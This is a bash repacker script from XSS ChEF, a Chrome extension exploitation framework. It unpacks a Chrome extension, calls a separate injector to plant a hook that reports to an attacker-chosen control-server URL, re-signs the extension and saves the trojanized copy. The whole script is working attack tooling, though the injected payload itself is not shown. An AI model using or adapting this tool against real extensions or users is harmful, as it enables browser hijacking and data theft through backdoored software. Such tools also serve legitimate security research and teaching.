
#!/usr/bin/env bash
# Usage:
# ./repacker.sh <file.crx> <new.crx> <xsschef-server-url> <hook-name>
#   XSS ChEF - Chrome Extension Exploitation framework
#    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
DIR=$( cd "$( dirname "$0" )" && pwd )
source $DIR/config.ini
RUNDIR=`pwd`
tempfoo=`basename $0`
TMPDIR=`mktemp -d -t ${tempfoo}` || exit 1
EXTDIR="$TMPDIR"

function cleanup {
    rm -rf "$TMPDIR"
}

function bailout () {
    echo "Error: $1" >&2
    cleanup
    exit 1
}

if [ ! -x "$CHROMEPATH" ]; then
    bailout "You must set correct CHROMEPATH in tools/config.ini"
fi

echo "Unpacking $1..."
# supress warning about extra prefix bytes
unzip -qo "$1" -d "$EXTDIR" 2>/dev/null
echo "Injecting xsschef..."
$DIR/inject-xsschef.php "$EXTDIR" "$3" "$4" || bailout "Injection failed"

echo "Signing $EXTDIR..."
"$CHROMEPATH" --pack-extension="$EXTDIR" --pack-extension-key="$PEM" --no-message-box
if (( $? )) ; then 
 bailout "Signing in Chrome FAILED." 
fi

echo "Moving signed extension to $2"
mv "`dirname "$EXTDIR"`/`basename "$EXTDIR"`.crx" $2
cleanup
